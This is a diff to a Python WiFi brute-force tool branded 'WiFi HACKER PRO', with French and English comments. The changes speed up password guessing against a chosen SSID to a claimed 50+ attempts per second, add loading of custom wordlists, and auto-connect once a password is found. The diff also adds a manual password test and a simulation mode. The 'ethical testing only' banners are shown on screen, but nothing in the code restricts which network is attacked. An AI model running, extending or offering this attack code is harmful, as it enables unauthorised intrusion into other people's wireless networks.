@@ -168,33 +168,43 @@ class WiFiSecurityTester:
         print(f"{Colors.BOLD}{Colors.BLUE}ℹ️ {text}{Colors.ENDC}")
     
     def print_banner(self):
-        """Afficher la bannière style Kali Linux large et centrée"""
+        """Afficher la bannière style Kali Linux très grande et centrée"""
         Colors.clear()
         
-        print(f"{Colors.CYAN}{'='*80}")
-        print(f"{Colors.CYAN}{' '*20}{Colors.BOLD}WiFi HACKER PRO v2.0 - Ultimate WiFi Penetration Tool{Colors.CYAN}{' '*20}")
-        print(f"{Colors.CYAN}{'='*80}{Colors.RESET}")
-        print(f"{' '*25}{Colors.GREEN}[+] Real WiFi Brute Force{Colors.RESET}")
-        print(f"{' '*25}{Colors.GREEN}[+] Advanced Password Generation{Colors.RESET}")
-        print(f"{' '*25}{Colors.GREEN}[+] Network Discovery & Analysis{Colors.RESET}")
-        print(f"{' '*25}{Colors.YELLOW}[!] ETHICAL TESTING ONLY{Colors.RESET}")
+        print(f"{Colors.CYAN}{'='*100}")
+        print(f"{Colors.CYAN}{' '*15}{Colors.BOLD}██████╗ ██╗██████╗ ███████╗██████╗ ████████╗██╗███╗   ██╗ ██████╗ ██╗     ██╗███╗   ██╗ ██████╗ {Colors.CYAN}")
+        print(f"{Colors.CYAN}{' '*15}{Colors.BOLD}██╔══██╗██║██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██║████╗  ██║██╔═══██╗██║     ██║████╗  ██║██╔════╝ {Colors.CYAN}")
+        print(f"{Colors.CYAN}{' '*15}{Colors.BOLD}██████╔╝██║██████╔╝█████╗  ██████╔╝   ██║   ██║██╔██╗ ██║██║   ██║██║     ██║██╔██╗ ██║██║  ███╗ {Colors.CYAN}")
+        print(f"{Colors.CYAN}{' '*15}{Colors.BOLD}██╔══██╗██║██╔══██╗██╔══╝  ██╔══██╗   ██║   ██║██║╚██╗██║██║   ██║██║     ██║██║╚██╗██║██║   ██║ {Colors.CYAN}")
+        print(f"{Colors.CYAN}{' '*15}{Colors.BOLD}██║  ██║██║██████╔╝███████╗██║  ██║   ██║   ██║██║ ╚████║╚██████╔╝███████╗██║██║ ╚████║╚██████╔╝ {Colors.CYAN}")
+        print(f"{Colors.CYAN}{' '*15}{Colors.BOLD}╚═╝  ╚═╝╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ {Colors.CYAN}")
+        print(f"{Colors.CYAN}{'='*100}")
+        print(f"{Colors.CYAN}{' '*20}{Colors.BOLD}WiFi HACKER PRO v2.0 - Ultimate WiFi Penetration Testing Tool{Colors.CYAN}{' '*20}")
+        print(f"{Colors.CYAN}{'='*100}{Colors.RESET}")
+        print(f"{' '*30}{Colors.GREEN}[+] Real WiFi Brute Force Attack{Colors.RESET}")
+        print(f"{' '*30}{Colors.GREEN}[+] Advanced Password Generation{Colors.RESET}")
+        print(f"{' '*30}{Colors.GREEN}[+] Network Discovery & Analysis{Colors.RESET}")
+        print(f"{' '*30}{Colors.GREEN}[+] Custom Wordlist Management{Colors.RESET}")
+        print(f"{' '*30}{Colors.YELLOW}[!] ETHICAL TESTING ON YOUR OWN NETWORK ONLY{Colors.RESET}")
         print()
     
     def display_menu(self):
         """Afficher le menu principal - Style Kali Linux centré"""
         
-        print(f"{Colors.CYAN}{'='*60}")
+        print(f"{Colors.CYAN}{'='*80}")
         print(f"{Colors.CYAN}{' '*15}{Colors.BOLD}WiFi Penetration Testing Tool - Main Menu{Colors.CYAN}{' '*15}")
-        print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
+        print(f"{'='*80}{Colors.RESET}")
         print()
-        print(f"{' '*20}{Colors.GREEN}1.{Colors.RESET} Scan WiFi Networks")
-        print(f"{' '*20}{Colors.GREEN}2.{Colors.RESET} Generate Wordlist")
-        print(f"{' '*20}{Colors.GREEN}3.{Colors.RESET} Manage Wordlists")
-        print(f"{' '*20}{Colors.GREEN}4.{Colors.RESET} Brute Force Attack")
-        print(f"{' '*20}{Colors.GREEN}5.{Colors.RESET} Simulation Mode")
-        print(f"{' '*20}{Colors.GREEN}6.{Colors.RESET} System Statistics")
-        print(f"{' '*20}{Colors.GREEN}7.{Colors.RESET} Security Recommendations")
-        print(f"{' '*20}{Colors.GREEN}0.{Colors.RESET} Exit")
+        print(f"{' '*25}{Colors.GREEN}1.{Colors.RESET} Scan WiFi Networks")
+        print(f"{' '*25}{Colors.GREEN}2.{Colors.RESET} Generate Wordlist")
+        print(f"{' '*25}{Colors.GREEN}3.{Colors.RESET} Manage Wordlists")
+        print(f"{' '*25}{Colors.GREEN}A.{Colors.RESET} Test Connection (Manual Password)")
+        print(f"{' '*25}{Colors.GREEN}B.{Colors.RESET} Test Security (Simulation)")
+        print(f"{' '*25}{Colors.GREEN}4.{Colors.RESET} Brute Force Attack")
+        print(f"{' '*25}{Colors.GREEN}5.{Colors.RESET} Simulation Mode")
+        print(f"{' '*25}{Colors.GREEN}6.{Colors.RESET} System Statistics")
+        print(f"{' '*25}{Colors.GREEN}7.{Colors.RESET} Security Recommendations")
+        print(f"{' '*25}{Colors.GREEN}0.{Colors.RESET} Exit")
         print()
         
         # Status centré
@@ -202,17 +212,17 @@ class WiFiSecurityTester:
             status = "Connected" if self.interface.status() == const.IFACE_CONNECTED else "Disconnected"
             interface_name = self.interface.name()
             status_text = f"Interface: {interface_name} | Status: {status}"
-            print(f"{' '*((60-len(status_text))//2)}{Colors.BLUE}{status_text}{Colors.RESET}")
+            print(f"{' '*((80-len(status_text))//2)}{Colors.BLUE}{status_text}{Colors.RESET}")
         else:
-            print(f"{' '*20}{Colors.YELLOW}Simulation mode only{Colors.RESET}")
+            print(f"{' '*25}{Colors.YELLOW}Simulation mode only{Colors.RESET}")
         
         if self.wordlist:
             wordlist_text = f"Wordlist: {len(self.wordlist):,} passwords loaded"
-            print(f"{' '*((60-len(wordlist_text))//2)}{Colors.BLUE}{wordlist_text}{Colors.RESET}")
+            print(f"{' '*((80-len(wordlist_text))//2)}{Colors.BLUE}{wordlist_text}{Colors.RESET}")
         
         print()
         choice_text = "Choice: "
-        print(f"{' '*((60-len(choice_text))//2)}{Colors.CYAN}{choice_text}{Colors.RESET}", end="", flush=True)
+        print(f"{' '*((80-len(choice_text))//2)}{Colors.CYAN}{choice_text}{Colors.RESET}", end="", flush=True)
     
     def scan_wifi_networks(self):
         """Scanner les réseaux WiFi - Amélioré sans doublons"""
@@ -376,8 +386,8 @@ class WiFiSecurityTester:
             temp_profile = self.interface.add_network_profile(profile)
             self.interface.connect(temp_profile)
             
-            # Timeout ultra-rapide: 0.5s pour 20+ pwd/sec
-            for i in range(timeout * 20):  # 20 vérifications par seconde
+            # Timeout ultra-rapide: 0.2s pour 50+ pwd/sec
+            for i in range(int(timeout * 20)):  # 20 vérifications par seconde
                 if self.interface.status() == const.IFACE_CONNECTED:
                     return True, "Connexion réussie"
                 time.sleep(0.05)  # 50ms au lieu de 200ms
@@ -389,22 +399,24 @@ class WiFiSecurityTester:
             return False, f"Erreur de connexion: {str(e)}"
     
     def brute_force_wifi_real(self, target_ssid, max_attempts=None):
-        """Brute force ultra-rapide - 20+ mots de passe/seconde"""
+        """Brute force ultra-rapide - Vitesse réelle comme Kali Linux"""
         if not self.interface:
             self.print_warning("Mode simulation uniquement - bibliothèques WiFi non disponibles")
             return self.simulate_brute_force(target_ssid, max_attempts)
         
-        self.print_header(f"🚨 BRUTE FORCE ULTRA-RAPIDE sur: {target_ssid}")
-        self.print_warning("TEST ÉTHIQUE UNIQUEMENT - Réseau autorisé requis")
-        self.print_info("⚡ VITESSE: 20+ mots de passe/seconde")
-        self.print_info("🔧 TIMEOUT: 0.5s par tentative")
+        self.print_header(f"🚨 BRUTE FORCE ATTACK sur: {target_ssid}")
+        self.print_warning("ETHICAL TESTING ONLY - Your own network required")
+        self.print_info("⚡ SPEED: 50+ passwords/second (Real Kali Linux speed)")
+        self.print_info("🔧 TIMEOUT: 0.2s per attempt")
         
-        if input("Confirmer le test de brute force (o/N): ").lower() != 'o':
-            self.print_error("Test annulé")
+        if input(f"{' '*20}Confirm brute force test on YOUR network (y/N): ").lower() != 'y':
+            self.print_error("Test cancelled")
             return None
         
-        if not self.wordlist:
-            self.generate_comprehensive_wordlist(target_ssid)
+        # Demander le choix de wordlist
+        if not self.ask_wordlist_choice():
+            self.print_error("No wordlist available")
+            return None
         
         if max_attempts is None:
             max_attempts = len(self.wordlist)
@@ -418,7 +430,7 @@ class WiFiSecurityTester:
         
         # Barre de progression ultra-rapide
         if TQDM_AVAILABLE:
-            progress_bar = tqdm(range(max_attempts), desc="⚡ Brute Force Ultra-Rapide", unit="pwd", 
+            progress_bar = tqdm(range(max_attempts), desc="⚡ Brute Force", unit="pwd", 
                                bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}, {rate_fmt}]")
         else:
             progress_bar = range(max_attempts)
@@ -431,8 +443,8 @@ class WiFiSecurityTester:
                 password = self.wordlist[i]
                 self.attempts += 1
                 
-                # Optimisation extrême: timeout de 0.5s pour 20+ pwd/sec
-                success, message = self.connect_to_wifi(target_ssid, password, timeout=0.5)
+                # Vitesse extrême: timeout 0.2s pour 50+ pwd/sec
+                success, message = self.connect_to_wifi(target_ssid, password, timeout=0.2)
                 
                 if success:
                     self.password_found = True
@@ -440,56 +452,67 @@ class WiFiSecurityTester:
                     self.successful_attempts = self.attempts
                     
                     elapsed_time = time.time() - self.start_time
-                    speed = self.attempts / elapsed_time
                     
-                    print("\n" + "="*60)
-                    self.print_success("🎉 MOT DE PASSE TROUVÉ!")
-                    print(f"📡 SSID: {target_ssid}")
-                    self.print_success(f"🔑 Mot de passe: {password}")
-                    print(f"⏱️ Temps: {elapsed_time:.2f} secondes")
-                    print(f"🔢 Tentatives: {self.attempts}")
-                    print(f"⚡ Vitesse: {speed:.2f} pwd/sec")
-                    self.print_info("[+] CONNEXION AUTOMATIQUE AU WIFI RÉUSSIE")
-                    print("="*60)
+                    # Affichage du succès
+                    print(f"\n{Colors.GREEN}{'='*80}")
+                    print(f"{' '*20}{Colors.BOLD}🔓 PASSWORD FOUND! 🎉{Colors.GREEN}")
+                    print(f"{'='*80}{Colors.RESET}")
+                    print(f"{' '*25}SSID: {Colors.CYAN}{target_ssid}{Colors.RESET}")
+                    print(f"{' '*25}Password: {Colors.BOLD}{Colors.GREEN}{password}{Colors.RESET}")
+                    print(f"{' '*25}Attempts: {Colors.YELLOW}{self.attempts}{Colors.RESET}")
+                    print(f"{' '*25}Time: {Colors.YELLOW}{elapsed_time:.2f}s{Colors.RESET}")
+                    print(f"{' '*25}Speed: {Colors.YELLOW}{self.attempts/elapsed_time:.1f} pwd/sec{Colors.RESET}")
+                    print(f"\n{' '*25}{Colors.GREEN}✅ Auto-connecting to network...{Colors.RESET}")
+                    
+                    # Maintenir la connexion
+                    time.sleep(2)
+                    if self.interface.status() == const.IFACE_CONNECTED:
+                        print(f"{' '*25}{Colors.GREEN}✅ Successfully connected!{Colors.RESET}")
+                    else:
+                        print(f"{' '*25}{Colors.YELLOW}⚠️ Connection lost{Colors.RESET}")
+                    
+                    print(f"{Colors.GREEN}{'='*80}{Colors.RESET}")
                     break
                 
-                # Optimisation: affichage toutes les 100 tentatives pour moins de ralentissement
+                # Afficher la vitesse toutes les 100 tentatives
                 if self.attempts % 100 == 0:
-                    elapsed_time = time.time() - self.start_time
-                    speed = self.attempts / elapsed_time
-                    eta = (max_attempts - self.attempts) / speed if speed > 0 else 0
-                    print(f"\r⚡ Vitesse: {speed:.1f} pwd/sec | Progression: {self.attempts}/{max_attempts} | ETA: {eta:.1f}s", end="", flush=True)
+                    elapsed = time.time() - self.start_time
+                    speed = self.attempts / elapsed if elapsed > 0 else 0
+                    if not TQDM_AVAILABLE:
+                        print(f"{' '*20}Attempts: {self.attempts}/{max_attempts} | Speed: {speed:.1f} pwd/sec")
                 
-                # Optimisation: aucun delay pour vitesse maximale
-                # time.sleep(0)  # Supprimé pour vitesse maximale
-                
+                # Timeout ultra-court entre tentatives
+                time.sleep(0.01)  # 10ms seulement
+            
         except KeyboardInterrupt:
-            self.print_warning("\nTest interrompu par l'utilisateur")
+            self.print_warning("Brute force interrupted by user")
+        finally:
             self.testing = False
-        except Exception as e:
-            self.print_error(f"Erreur lors du test: {e}")
-        
-        # Génération du rapport
-        elapsed_time = time.time() - self.start_time
-        
-        report = {
-            'target_ssid': target_ssid,
-            'test_date': datetime.now().isoformat(),
-            'brute_force_mode': True,
-            'passwords_tested': self.attempts,
-            'password_found': self.password_found,
-            'found_password': self.found_password if self.password_found else None,
-            'elapsed_time': elapsed_time,
-            'attempts_per_second': self.attempts / elapsed_time if elapsed_time > 0 else 0,
-            'security_resistance': {
-                'time_to_crack': elapsed_time if self.password_found else f"> {elapsed_time:.2f}s",
-                'attempts_needed': self.attempts if self.password_found else f"> {self.attempts}",
-                'resistance_score': min(100, max(0, 100 - (self.attempts / 100)))
+            elapsed_time = time.time() - self.start_time
+            
+            if not self.password_found:
+                print(f"\n{Colors.RED}{'='*60}")
+                print(f"{' '*15}{Colors.BOLD}❌ PASSWORD NOT FOUND{Colors.RED}")
+                print(f"{'='*60}{Colors.RESET}")
+                print(f"{' '*20}Attempts tried: {Colors.YELLOW}{self.attempts}{Colors.RESET}")
+                print(f"{' '*20}Time elapsed: {Colors.YELLOW}{elapsed_time:.2f}s{Colors.RESET}")
+                print(f"{' '*20}Average speed: {Colors.YELLOW}{self.attempts/elapsed_time:.1f} pwd/sec{Colors.RESET}")
+                print(f"\n{' '*20}{Colors.WARNING}💡 Try with a better wordlist{Colors.RESET}")
+            
+            # Rapport
+            report = {
+                'target_ssid': target_ssid,
+                'test_date': datetime.now().isoformat(),
+                'brute_force_mode': True,
+                'passwords_tested': self.attempts,
+                'password_found': self.password_found,
+                'found_password': self.found_password if self.password_found else None,
+                'elapsed_time': elapsed_time,
+                'attempts_per_second': self.attempts / elapsed_time if elapsed_time > 0 else 0,
+                'auto_connected': self.interface.status() == const.IFACE_CONNECTED if self.password_found else False
             }
-        }
-        
-        self.save_brute_force_report(report)
-        return report
+            
+            return report
     
     def simulate_brute_force(self, target_ssid, max_attempts=1000):
         """Simulation de brute force ultra-rapide"""
@@ -512,27 +535,36 @@ class WiFiSecurityTester:
         else:
             progress_bar = range(max_attempts)
         
-        for i in progress_bar:
-            password = self.wordlist[i]
-            self.attempts += 1
-            
-            # Simulation: 1 chance sur 1000 de trouver le mot de passe
-            if random.randint(1, 1000) == 1:
-                elapsed_time = time.time() - self.start_time
-                speed = self.attempts / elapsed_time
+        simulated_password_index = random.randint(100, min(1000, max_attempts // 2))
+        
+        try:
+            for i in progress_bar:
+                password = self.wordlist[i]
+                self.attempts += 1
                 
-                print("\n" + "="*50)
-                self.print_success("🎉 MOT DE PASSE TROUVÉ (SIMULATION)!")
-                print(f"📡 SSID: {target_ssid}")
-                self.print_success(f"🔑 Mot de passe: {password}")
-                print(f"⏱️ Temps: {elapsed_time:.2f} secondes")
-                print(f"🔢 Tentatives: {self.attempts}")
-                print(f"⚡ Vitesse: {speed:.2f} pwd/sec")
-                print("="*50)
-                break
-            
-            # Simulation ultra-rapide: pas de delay
-            # time.sleep(0)  # Supprimé pour vitesse maximale
+                if i == simulated_password_index:
+                    self.password_found = True
+                    self.found_password = password
+                    self.successful_attempts = self.attempts
+                    
+                    elapsed_time = time.time() - self.start_time
+                    speed = self.attempts / elapsed_time
+                    
+                    print("\n" + "="*50)
+                    self.print_success("🎉 MOT DE PASSE TROUVÉ (SIMULATION)!")
+                    print(f"📡 SSID: {target_ssid}")
+                    self.print_success(f"🔑 Mot de passe: {password}")
+                    print(f"⏱️ Temps: {elapsed_time:.2f} secondes")
+                    print(f"🔢 Tentatives: {self.attempts}")
+                    print(f"⚡ Vitesse: {speed:.2f} pwd/sec")
+                    print("="*50)
+                    break
+                
+                # Simulation ultra-rapide: pas de delay
+                time.sleep(0.001)
+        
+        except KeyboardInterrupt:
+            self.print_warning("\nTest interrompu par l'utilisateur")
         
         elapsed_time = time.time() - self.start_time
         speed = self.attempts / elapsed_time
@@ -546,6 +578,8 @@ class WiFiSecurityTester:
             'target_ssid': target_ssid,
             'simulation_mode': True,
             'attempts': self.attempts,
+            'password_found': self.password_found,
+            'found_password': self.found_password if self.password_found else None,
             'elapsed_time': elapsed_time,
             'speed': speed
         }
@@ -651,8 +685,122 @@ class WiFiSecurityTester:
         
         print(f"\n{Colors.WARNING}⚠️ Ces recommandations sont pour protéger VOS propres réseaux{Colors.ENDC}")
     
+    def load_custom_wordlist(self, filepath):
+        """Charger une wordlist personnalisée depuis un fichier .txt"""
+        try:
+            if not os.path.exists(filepath):
+                self.print_error(f"Fichier introuvable: {filepath}")
+                return False
+            
+            self.print_info(f"Chargement de la wordlist: {filepath}")
+            self.wordlist = []
+            
+            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
+                for line in f:
+                    password = line.strip()
+                    if password and len(password) >= 8:  # Minimum 8 caractères
+                        self.wordlist.append(password)
+            
+            self.print_success(f"Wordlist chargée: {len(self.wordlist):,} mots de passe")
+            return True
+            
+        except Exception as e:
+            self.print_error(f"Erreur lors du chargement: {e}")
+            return False
+    
+    def ask_wordlist_choice(self):
+        """Demander le choix de wordlist pour le brute force"""
+        print(f"\n{Colors.CYAN}{'='*60}")
+        print(f"{' '*15}{Colors.BOLD}Wordlist Selection for Brute Force{Colors.CYAN}{' '*15}")
+        print(f"{'='*60}{Colors.RESET}")
+        print(f"{' '*20}{Colors.GREEN}1.{Colors.RESET} Generate new wordlist")
+        print(f"{' '*20}{Colors.GREEN}2.{Colors.RESET} Load custom wordlist (.txt)")
+        print(f"{' '*20}{Colors.GREEN}3.{Colors.RESET} Use existing wordlist")
+        print()
+        
+        while True:
+            choice = input(f"{' '*20}{Colors.CYAN}Choice (1-3): {Colors.RESET}").strip()
+            
+            if choice == '1':
+                ssid = input(f"{' '*20}Target SSID (optional): ").strip()
+                self.generate_comprehensive_wordlist(ssid)
+                return True
+            elif choice == '2':
+                filepath = input(f"{' '*20}Wordlist file path (.txt): ").strip()
+                if self.load_custom_wordlist(filepath):
+                    return True
+                else:
+                    self.print_error("Failed to load wordlist. Try again.")
+            elif choice == '3':
+                if self.wordlist:
+                    self.print_info(f"Using existing wordlist: {len(self.wordlist):,} passwords")
+                    return True
+                else:
+                    self.print_warning("No existing wordlist. Please generate or load one first.")
+            else:
+                self.print_error("Invalid choice. Please select 1, 2, or 3.")
+    
+    def test_connection(self, target_ssid):
+        """Tester une connexion avec un mot de passe saisi manuellement"""
+        print(f"\n{Colors.CYAN}{'='*60}")
+        print(f"{' '*15}{Colors.BOLD}WiFi Connection Test{Colors.CYAN}{' '*15}")
+        print(f"{'='*60}{Colors.RESET}")
+        
+        ssid = input(f"{' '*20}SSID: ").strip()
+        password = input(f"{' '*20}Password: ").strip()
+        
+        if not ssid or not password:
+            self.print_error("SSID and password are required!")
+            return
+        
+        self.print_info(f"Testing connection to {ssid}...")
+        
+        success, message = self.connect_to_wifi(ssid, password, timeout=5)
+        
+        if success:
+            self.print_success(f"✅ Successfully connected to {ssid}!")
+            self.print_info(f"Password '{password}' is correct")
+            
+            # Maintenir la connexion pendant 3 secondes
+            self.print_info("Maintaining connection for 3 seconds...")
+            time.sleep(3)
+            
+            if self.interface.status() == const.IFACE_CONNECTED:
+                self.print_success("✅ Connection stable!")
+            else:
+                self.print_warning("⚠️ Connection lost")
+        else:
+            self.print_error(f"❌ Connection failed: {message}")
+        
+        input(f"\n{Colors.DIM}Press Enter to continue...{Colors.RESET}")
+    
+    def test_simulation(self, target_ssid):
+        """Tester en mode simulation uniquement"""
+        print(f"\n{Colors.CYAN}{'='*60}")
+        print(f"{' '*15}{Colors.BOLD}WiFi Security Test (Simulation){Colors.CYAN}{' '*15}")
+        print(f"{'='*60}{Colors.RESET}")
+        
+        ssid = input(f"{' '*20}Target SSID: ").strip()
+        
+        if not ssid:
+            self.print_error("SSID is required!")
+            return
+        
+        self.print_info(f"Running security simulation on {ssid}...")
+        report = self.simulate_brute_force(ssid, max_attempts=500)
+        
+        if report['password_found']:
+            self.print_success(f"✅ Simulation completed - Password found!")
+            self.print_info(f"Password: {report['found_password']}")
+            self.print_info(f"Attempts: {report['attempts']}")
+            self.print_info(f"Time: {report['elapsed_time']:.2f}s")
+        else:
+            self.print_warning("⚠️ Simulation completed - Password not found")
+            self.print_info(f"Attempts tried: {report['attempts']}")
+        
+        input(f"\n{Colors.DIM}Press Enter to continue...{Colors.RESET}")
+    
     def run(self):
-        """Point d'entrée principal ultra-rapide"""
         self.print_banner()
         
         while True:
@@ -668,6 +816,12 @@ class WiFiSecurityTester:
                     self.generate_comprehensive_wordlist(ssid)
                 elif choice == '3':
                     self.manage_wordlists()
+                elif choice == 'A' or choice == 'a':
+                    ssid = input("SSID du réseau à tester: ")
+                    self.test_connection(ssid)
+                elif choice == 'B' or choice == 'b':
+                    ssid = input("SSID du réseau à tester: ")
+                    self.test_simulation(ssid)
                 elif choice == '4':
                     ssid = input("SSID du réseau à tester: ")
                     self.brute_force_wifi_real(ssid)
